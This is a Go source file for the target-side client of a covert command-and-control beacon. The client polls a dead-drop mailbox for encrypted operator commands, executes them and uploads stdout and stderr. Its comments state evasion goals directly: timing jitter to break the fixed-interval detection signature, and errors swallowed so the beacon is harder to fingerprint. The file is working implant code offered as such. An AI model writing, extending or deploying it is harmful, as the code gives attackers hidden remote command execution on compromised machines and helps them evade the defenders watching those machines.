package beacon

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// Command is the plaintext an operator sends to a beacon. It is sealed into a
// fixed-size frame before it ever reaches the mailbox.
type Command struct {
	Cmd     string `json:"cmd"`
	Timeout int    `json:"timeout,omitempty"` // seconds; 0 = client default
	Tag     string `json:"tag,omitempty"`     // echoed back for correlation
}

// Result is the plaintext a beacon sends back.
type Result struct {
	Tag    string `json:"tag,omitempty"`
	Code   int    `json:"code"`
	Stdout string `json:"stdout,omitempty"`
	Stderr string `json:"stderr,omitempty"`
	Error  string `json:"error,omitempty"`
	At     int64  `json:"at"` // unix seconds
}

// Runner executes one command and returns combined output.
type Runner func(ctx context.Context, cmd string) Result

// ClientConfig configures a target-side beacon.
type ClientConfig struct {
	ChannelID string
	PSK       []byte
	Mailbox   Mailbox
	Runner    Runner
	// Interval is the base heartbeat period. Jitter widens it by ±Jitter
	// (0.4 means ±40%), which breaks the "every 60s exactly" detection signature.
	Interval time.Duration
	Jitter   float64
	// MaxCommands bounds how many commands are handled per cycle.
	MaxCommands int
}

// Client is the target-side half of the dead drop. It never listens on a port:
// each cycle it polls for commands, runs them, and writes results back.
type Client struct {
	cfg ClientConfig
	rng *rand.Rand
}

// NewClient validates and builds a client.
func NewClient(cfg ClientConfig) (*Client, error) {
	if cfg.ChannelID == "" {
		return nil, errors.New("beacon: channel id required")
	}
	if len(cfg.PSK) == 0 {
		return nil, errors.New("beacon: psk required")
	}
	if cfg.Mailbox == nil {
		return nil, errors.New("beacon: mailbox required")
	}
	if cfg.Runner == nil {
		return nil, errors.New("beacon: runner required")
	}
	if cfg.Interval <= 0 {
		cfg.Interval = 60 * time.Second
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 0.4
	}
	if cfg.Jitter > 0.9 {
		cfg.Jitter = 0.9
	}
	if cfg.MaxCommands <= 0 {
		cfg.MaxCommands = 5
	}
	return &Client{cfg: cfg, rng: rand.New(rand.NewSource(time.Now().UnixNano()))}, nil
}

// NextDelay returns the jittered sleep before the next cycle.
func (c *Client) NextDelay() time.Duration {
	spread := c.cfg.Jitter * 2 // total window width
	off := (c.rng.Float64()*spread - c.cfg.Jitter)
	return time.Duration(float64(c.cfg.Interval) * (1 + off))
}

// Run polls until ctx is cancelled. Errors are swallowed by design: a beacon that
// complains loudly (or changes cadence on failure) is easy to fingerprint.
func (c *Client) Run(ctx context.Context, onError func(error)) {
	var lastIn uint64
	for {
		err := c.Cycle(ctx, &lastIn)
		if err != nil && onError != nil {
			onError(err)
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(c.NextDelay()):
		}
	}
}

// Cycle performs one poll/execute/upload round. lastIn carries the highest
// inbound sequence already handled so replays are ignored.
func (c *Client) Cycle(ctx context.Context, lastIn *uint64) error {
	if lastIn == nil {
		return errors.New("beacon: lastIn required")
	}
	envs, err := c.cfg.Mailbox.List(ctx, c.cfg.ChannelID, Outbound, *lastIn, c.cfg.MaxCommands)
	if err != nil {
		return err
	}
	for _, env := range envs {
		frame, err := HexToFrame(env.Frame)
		if err != nil {
			continue
		}
		plain, seq, err := Open(c.cfg.PSK, frame, *lastIn)
		if err != nil {
			// Replay or tamper: acknowledge it so the queue can move on.
			*lastIn = maxU64(*lastIn, env.Seq)
			_ = c.cfg.Mailbox.Delete(ctx, c.cfg.ChannelID, Outbound, []uint64{env.Seq})
			continue
		}
		*lastIn = seq
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil || strings.TrimSpace(cmd.Cmd) == "" {
			_ = c.cfg.Mailbox.Delete(ctx, c.cfg.ChannelID, Outbound, []uint64{env.Seq})
			continue
		}
		res := c.cfg.Runner(ctx, cmd.Cmd)
		res.Tag = cmd.Tag
		res.At = time.Now().Unix()
		if err := c.upload(ctx, res); err != nil {
			// Keep the command in the mailbox so the next cycle retries it.
			return err
		}
		_ = c.cfg.Mailbox.Delete(ctx, c.cfg.ChannelID, Outbound, []uint64{env.Seq})
	}
	return nil
}

// upload seals and stores one result. The client needs its own outgoing sequence
// number; it derives it from the mailbox contents to stay stateless across
// restarts.
func (c *Client) upload(ctx context.Context, res Result) error {
	payload, err := json.Marshal(res)
	if err != nil {
		return err
	}
	// Determine the next outbound seq from what the mailbox already holds.
	existing, err := c.cfg.Mailbox.List(ctx, c.cfg.ChannelID, Inbound, 0, 1)
	if err != nil {
		return err
	}
	var next uint64 = 1
	if len(existing) > 0 {
		next = existing[len(existing)-1].Seq + 1
	}
	frame, err := Seal(c.cfg.PSK, next, payload)
	if err != nil {
		return err
	}
	return c.cfg.Mailbox.Put(ctx, c.cfg.ChannelID, Inbound, Envelope{Seq: next, Frame: FrameToHex(frame)})
}

// Heartbeat is a no-op result used when the operator asks for liveness only.
func (c *Client) Heartbeat(ctx context.Context) error {
	return c.upload(ctx, Result{Code: 0, Stdout: "", At: time.Now().Unix()})
}

func maxU64(a, b uint64) uint64 {
	if a > b {
		return a
	}
	return b
}

// ValidateChannelID is a light guard against path traversal in channel ids that
// end up as mailbox path segments.
func ValidateChannelID(id string) error {
	if id == "" || len(id) > 64 {
		return fmt.Errorf("beacon: 非法 channel id 长度")
	}
	for _, r := range id {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			continue
		}
		return fmt.Errorf("beacon: channel id 只允许小写字母与数字")
	}
	return nil
}
